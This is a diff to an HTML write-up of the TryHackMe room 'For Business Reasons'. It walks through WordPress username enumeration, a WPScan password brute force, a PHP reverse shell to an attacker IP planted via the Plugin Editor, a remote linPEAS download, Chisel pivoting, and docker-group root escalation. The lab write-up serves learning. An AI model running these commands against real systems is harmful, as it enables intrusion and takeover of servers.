@@ -18,11 +18,12 @@
   <div class="meta-row">
     <span class="pill">Room: For Business Reasons</span>
     <span class="pill">Category: Web / Pivoting / Linux Privesc</span>
-    <span class="pill">Tools: WPScan, LinPEAS, Chisel</span>
+    <span class="pill">Tools: WPScan, linPEAS, Chisel</span>
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a WordPress site, a weak admin password, and a network of Docker containers layered behind it. The job: get a shell, discover the internal network, tunnel into it, and escalate to root.</p>
+    <p><strong>The setup:</strong> a WordPress site on port 80, nothing else visible from outside. The job: get a foothold, then discover and reach a hidden internal Docker network to find root.</p>
+    <p>No single flag in these notes, the target is a root shell inside the internal network.</p>
   </div>
 
   <section>
@@ -32,13 +33,14 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Find a username, then brute-force the password</div>
-          <p>A default WordPress post, still attributed to its original author, gives away a likely username. <code>wpscan</code> confirms it's valid (the login form specifically says "unknown username" for invalid ones, a useful oracle), then brute-forces the password against it:</p>
-          <pre><code>wpscan --url http://&lt;target&gt;/ -U sysadmin -P /usr/share/wordlists/rockyou.txt</code></pre>
-          <p>A match comes back in under three minutes.</p>
+          <div class="step-title">Find a username, then confirm it the slow way</div>
+          <p>A WordPress "Test post" byline, "By sysadmin," hands over a candidate username before any scanning tool runs. Typing it into the login form with a wrong password confirms it's real, WordPress's own error message gives it away:</p>
+          <pre><code>Error: The password you entered for the username sysadmin is incorrect.
+Lost your password?</code></pre>
+          <p>(A nonexistent username instead returns "Unknown username. Check again or try your email address," a different message entirely.)</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A login form that distinguishes "wrong username" from "wrong password" is a username-enumeration oracle, whether or not that was the intent. Once a username is confirmed valid, brute-forcing the password alone is a much smaller search space.</p>
+            <p>WordPress's default login form leaks exactly the thing an attacker wants to know, whether a username exists, through two different error strings. That distinction is what every later brute-force attempt needs to actually target a real account.</p>
           </div>
         </div>
       </div>
@@ -46,13 +48,20 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Get a shell through the plugin editor</div>
-          <p>Logged in as admin, the built-in plugin editor accepts arbitrary PHP. A single line appended to an inactive plugin, then activated with a listener running:</p>
-          <pre><code>exec('/bin/bash -c "bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1"');</code></pre>
-          <p>lands a shell as the low-privilege web user the instant the plugin activates.</p>
+          <div class="step-title">Confirm XML-RPC, then brute-force the password</div>
+          <pre><code>wpscan --url 10.10.148.62
+
+[+] XML-RPC seems to be enabled: http://10.10.148.62/xmlrpc.php
+    Found By: Direct Access (Aggressive Detection)
+    Confidence: 100%</code></pre>
+          <p>XML-RPC being enabled means WordPress's <code>system.multicall</code> endpoint can test many credential pairs in a single HTTP request, dramatically speeding up a brute force:</p>
+          <pre><code>wpscan --url 10.10.77.148/ -U sysadmin -P /usr/share/wordlists/rockyou.txt
+
+[!] Valid Combinations Found:
+ | Username: sysadmin, Password: milkshake</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>WordPress admin access is, by design, a way to execute arbitrary PHP through the theme/plugin editors. There's no separate vulnerability needed, the credentials alone are the exploit.</p>
+            <p>XML-RPC's bulk request feature exists for legitimate blogging clients, but it also happens to let a brute-forcer skip WordPress's normal per-request overhead, which is exactly why WPScan checks for it first and calls it out as a finding on its own.</p>
           </div>
         </div>
       </div>
@@ -60,11 +69,20 @@
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Discover a hidden Docker network</div>
-          <p>Curling a static LinPEAS binary onto the box and running it surfaces multiple network interfaces with Docker-style private ranges, evidence the current container has visibility into other containers it wasn't obviously connected to. A quick static nmap binary and a netcat port probe confirm live hosts on those ranges.</p>
+          <div class="step-title">Turn the Plugin Editor into a shell</div>
+          <p>Logged in as <code>sysadmin</code>, the built-in Plugin Editor lets any installed plugin's PHP be edited directly. Appending one line to the inactive "Hello Dolly" plugin's <code>hello.php</code>:</p>
+          <pre><code>exec('/bin/bash -c "bash -i >&amp; /dev/tcp/10.2.57.21/4444 0>&amp;1"');</code></pre>
+          <p>Clicking <strong>Activate</strong> on the edited plugin runs that line immediately, with a listener already waiting:</p>
+          <pre><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.2.57.21] from (UNKNOWN) [10.10.140.47] 45810
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@3ffad52fb534:/var/www/html/wp-admin$ whoami
+www-data</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>LinPEAS surfaces exactly this kind of fact, extra network interfaces, in its standard output. A compromised container is often one hop away from an entire internal network most external scans would never see.</p>
+            <p>The Plugin Editor is, by design, a text editor for PHP files the server will execute on the next page load or activation. Any account with plugin-edit rights has code execution, no separate vulnerability required.</p>
           </div>
         </div>
       </div>
@@ -72,17 +90,40 @@
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Tunnel in with Chisel</div>
-          <p>With no direct route from the attack box to the internal Docker network, <code>chisel</code> builds a reverse tunnel: a server on the attack box, a client on the compromised container forwarding a chosen local port to an internal host's SSH port.</p>
-          <pre><code><span class="cm"># attack box</span>
-sudo chisel server -p 8001 --reverse -v
+          <div class="step-title">Find the hidden internal network</div>
+          <p>Running linPEAS (pulled over directly with <code>curl</code> from the attack box) surfaces something odd in its network section, interfaces on subnets that have nothing to do with the public-facing host:</p>
+          <pre><code>www-data@3ffad52fb534:/tmp$ curl http://10.2.57.21:8000/linpeasv3_2.sh -O linpeas.sh
 
-<span class="cm"># compromised container</span>
-./chisel64 client &lt;attacker-ip&gt;:8001 R:127.0.0.1:8005:&lt;internal-ip&gt;:22</code></pre>
-          <p>The server and local forwarding port have to be different numbers, reusing the same port for both fails silently with a confusing error. Once that's sorted, SSH to <code>127.0.0.1:8005</code> on the attack box reaches the internal container directly.</p>
+[+] Networks and neighbours
+Iface  Destination  Gateway    Flags  Mask
+eth2   00000000     010012AC   0003   00000000
+eth1   0000000A     00000000   0001   00FFFFFF
+eth0   0000FF0A     00000000   0001   0000FFFF
+eth2   000012AC     00000000   0001   0000FFFF
+
+IP address    HW type  Flags  HW address         Mask  Device
+10.0.0.2      0x1      0x2    02:42:0a:00:00:04  *     eth1
+10.0.0.5      0x1      0x2    02:42:0a:00:00:04  *     eth1
+172.18.0.1    0x1      0x2    02:42:e0:fc:f4:ac  *     eth2
+10.0.0.4      0x1      0x2    02:42:0a:00:00:04  *     eth1
+10.255.0.2    0x1      0x2    02:42:0a:ff:00:02  *     eth0</code></pre>
+          <p>The <code>02:42:...</code> MAC prefix is Docker's own default, this box is itself a container, sitting on at least two separate Docker networks. Pulling a static <code>nmap</code> binary over the same way and scanning both ranges confirms multiple live hosts:</p>
+          <pre><code>www-data@3ffad52fb534:/tmp$ ./nmap -sn 172.18.0.1/24 10.0.0.5/24
+
+Nmap scan report for 172.18.0.1
+Host is up (0.00048s latency).
+Nmap scan report for 172.18.0.2
+Host is up (0.00029s latency).
+Nmap scan report for 172.18.0.3
+Host is up (0.00020s latency).
+Nmap scan report for 172.18.0.4
+Host is up (0.00016s latency).</code></pre>
+          <p>A static <code>nc</code> binary, checked against the usual ports one host at a time, finds SSH open on the gateway address:</p>
+          <pre><code>www-data@3ffad52fb534:/tmp$ ./'nc(1)' -zv 172.18.0.1 22
+172.18.0.1 22 open</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Chisel tunnels an arbitrary TCP connection over a single outbound HTTP-like connection the compromised host can already make, turning one foothold into a route to anything that host can otherwise reach. It's the standard way to pivot when there's no direct network path.</p>
+            <p>A compromised host is a vantage point, not just an endpoint. linPEAS flagging unfamiliar network interfaces is exactly how a Docker-internal network that's completely invisible from outside the box gets discovered in the first place.</p>
           </div>
         </div>
       </div>
@@ -90,13 +131,60 @@ sudo chisel server -p 8001 --reverse -v
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Escalate to root through an lxd group membership</div>
-          <p>Checking group membership on the internal host shows the current user belongs to <code>lxd</code>. That group alone, with Docker available, is enough:</p>
-          <pre><code>docker run -v /:/mnt --rm -it mysql:5.7 sh</code></pre>
-          <p>Mounting the host's root filesystem into a throwaway container and shelling into it gives root, on the host, immediately.</p>
+          <div class="step-title">Build a reverse tunnel to reach it</div>
+          <p>Nothing on the attack box can route to <code>172.18.0.1</code> directly, so Chisel builds a tunnel through the compromised host instead. The server listens on the attack box, the client runs on the target and forwards a local port back through to the internal SSH service:</p>
+          <pre><code># attack box
+sudo chisel server -p 8001 --reverse -v
+
+# target (www-data shell)
+./chisel64 client 10.2.57.21:8001 R:127.0.0.1:8005:172.18.0.1:22</code></pre>
+          <p>The first attempt fails because the server and the forwarded local port were set to the same number:</p>
+          <pre><code>2021/06/27 11:58:53 server: session#1: Failed: server: Server cannot listen on R:127.0.0.1:8001=>172.18.0.1:22</code></pre>
+          <p>Moving the forward to a different local port (<code>8005</code>) fixes it:</p>
+          <pre><code>2021/06/27 12:05:24 server: session#2: tun: proxy#R:127.0.0.1:8005=>172.18.0.1:22: Listening
+2021/06/27 12:05:24 server: session#2: tun: SSH connected</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Membership in the <code>lxd</code> (or <code>docker</code>) group is functionally equivalent to root: anyone who can launch a container with the host filesystem bind-mounted can read, write, and execute anything on the host as root from inside that container.</p>
+            <p>Chisel's reverse mode makes the target dial out to the attack box, which sidesteps any inbound firewall on the target entirely. The server and the port being forwarded to the internal target have to be two distinct local ports, reusing one for both breaks the tunnel silently until the log line spells out why.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">SSH through the tunnel into the internal container</div>
+          <pre><code>ssh sysadmin@127.0.0.1 -p8005
+The authenticity of host '[127.0.0.1]:8005 ([127.0.0.1]:8005)' can't be established.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+sysadmin@127.0.0.1's password:
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+sysadmin@ubuntu:~$</code></pre>
+          <p>The same <code>sysadmin</code> credentials from the WordPress brute force work again here. Checking group membership turns up something worth a second look:</p>
+          <pre><code>sysadmin@ubuntu:/tmp$ id
+uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),122(docker)</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Credential reuse across completely different systems is common enough to always be worth trying first. The <code>lxd</code> and <code>docker</code> group memberships here are the real prize, both are well-known, direct paths to root on Linux.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Escalate to root by mounting the host filesystem</div>
+          <p>Membership in the <code>docker</code> group is root-equivalent: it allows starting a container with the host's entire filesystem bind-mounted inside it.</p>
+          <pre><code>sysadmin@ubuntu:/tmp$ docker run -v /:/mnt --rm -it mysql:5.7 sh
+# whoami
+root
+# hostname
+fa2d9c09f514
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>The Docker daemon itself runs as root, and anyone in the <code>docker</code> group can talk to it. Mounting <code>/</code> from the host into a throwaway container, then opening a shell inside that container, is root on the host, no exploit involved, just using the access the group membership already grants.</p>
           </div>
         </div>
       </div>
@@ -106,33 +194,51 @@ sudo chisel server -p 8001 --reverse -v
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>WordPress post: author name leaks a username
-  &rarr; wpscan brute force: weak admin password found
-       &rarr; plugin editor: reverse shell planted and triggered
-            &rarr; LinPEAS: hidden Docker network interfaces found
-                 &rarr; chisel reverse tunnel: internal container reached over SSH
-                      &rarr; lxd group membership + docker: host root via bind mount</code></pre>
+    <pre><code>WordPress "by sysadmin" byline &rarr; username confirmed via login error text
+  &rarr; WPScan + XML-RPC: sysadmin:milkshake cracked
+       &rarr; Plugin Editor: reverse shell as www-data
+            &rarr; linPEAS: unfamiliar Docker-style network interfaces found
+                 &rarr; nmap/nc (static binaries): internal hosts + SSH on 172.18.0.1
+                      &rarr; Chisel reverse tunnel: 127.0.0.1:8005 &rarr; 172.18.0.1:22
+                           &rarr; SSH as sysadmin (credential reuse)
+                                &rarr; id: docker group membership
+                                     &rarr; docker run -v /:/mnt: root</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Tools Used</h2>
+    <div class="ref-wrap">
+      <table class="ref">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>WPScan</td><td>XML-RPC detection and credential brute-forcing</td></tr>
+        <tr><td>WordPress Plugin Editor</td><td>Admin-authenticated PHP code execution</td></tr>
+        <tr><td>linPEAS</td><td>Enumeration that surfaced the hidden Docker networks</td></tr>
+        <tr><td>Static nmap / nc binaries</td><td>Internal network and port scanning without a full toolkit on the target</td></tr>
+        <tr><td>Chisel</td><td>Reverse SSH tunnel into the internal-only host</td></tr>
+        <tr><td>Docker (lxd/docker group abuse)</td><td>Root escalation via host filesystem bind-mount</td></tr>
+      </table>
+    </div>
   </section>
 
   <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
-        <div class="skill-title">Login error messages can leak more than intended</div>
-        <p>A form that distinguishes invalid username from invalid password is handing attackers a free username-enumeration oracle.</p>
+        <div class="skill-title">Login error messages are a username oracle</div>
+        <p>WordPress's default "unknown username" vs "incorrect password" distinction confirmed a valid account before a single scanning tool ran.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">One compromised container can expose a whole internal network</div>
-        <p>Extra interfaces on unfamiliar private ranges are worth investigating immediately, they're the difference between "one box" and "the whole environment."</p>
+        <div class="skill-title">An admin panel's code editor is remote code execution</div>
+        <p>Any feature that lets an authenticated user edit server-side code the application will execute is a shell waiting to happen, Plugin Editor included.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">lxd/docker group membership is root, full stop</div>
-        <p>There's no meaningful difference between "can run containers with host mounts" and "has root on the host." Audit that group membership as carefully as the actual sudoers file.</p>
+        <div class="skill-title">docker/lxd group membership is root, full stop</div>
+        <p>Both grant the ability to mount the host filesystem into a container. Auditing who's in those groups matters as much as auditing sudoers.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via WordPress exploitation, container pivoting, and lxd group abuse</footer>
+  <footer>tryhackme.com &middot; solved via WordPress exploitation, network pivoting, and container privilege escalation</footer>
 
 </div>
 </body>
